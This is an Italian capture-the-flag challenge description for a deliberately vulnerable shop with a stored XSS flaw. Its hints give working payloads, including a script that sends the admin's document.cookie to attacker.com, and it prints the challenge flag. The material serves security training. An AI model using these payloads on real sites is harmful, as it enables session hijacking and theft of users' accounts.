# Challenge: Stored XSS Exploit - Malicious Product Injection

## Descrizione
In questa challenge, hai accesso a un negozio online che permette di aggiungere nuovi prodotti e cercarli tramite un campo di ricerca.  
Tuttavia, il sistema non filtra correttamente gli input forniti dagli utenti, rendendolo vulnerabile a un attacco **Stored XSS (Cross-Site Scripting)**.  
Sfruttando questa vulnerabilità, potresti iniettare codice JavaScript dannoso che verrà eseguito ogni volta che un amministratore visita la pagina.

Sarà possibile eseguire codice malevolo nel browser dell'admin e ottenere il suo cookie di sessione?

## Obiettivo
- **Sfrutta la vulnerabilità Stored XSS** inserendo uno script malevolo nel nome, descrizione o immagine di un prodotto.
- **Attendi che l’admin visiti la pagina**, eseguendo il codice iniettato.
- **Recupera il cookie dell’admin** che contiene la flag `flag{you_changed_my_website??}`.

## Suggerimenti
- Il form di creazione dei prodotti accetta input arbitrari e li visualizza nella pagina senza sanitizzazione.
- Prova a inserire un payload come `<script>alert('XSS!')</script>` nel nome o nella descrizione di un prodotto.
- Puoi anche provare a rubare il cookie dell’admin inviandolo a un tuo server con `<script>fetch('https://attacker.com/log?cookie='+encodeURIComponent(document.cookie))</script>`.
- Ci sono dei siti come [Beeceptor](https://beeceptor.com/) che ti permettono di creare un server fittizio per ricevere i dati inviati con `fetch`.
- È possibile iniettare codice JavaScript anche nell’URL di un’immagine, ad esempio `<img src=x onerror="alert('XSS!')">`.

Buona fortuna! 🚀🔓
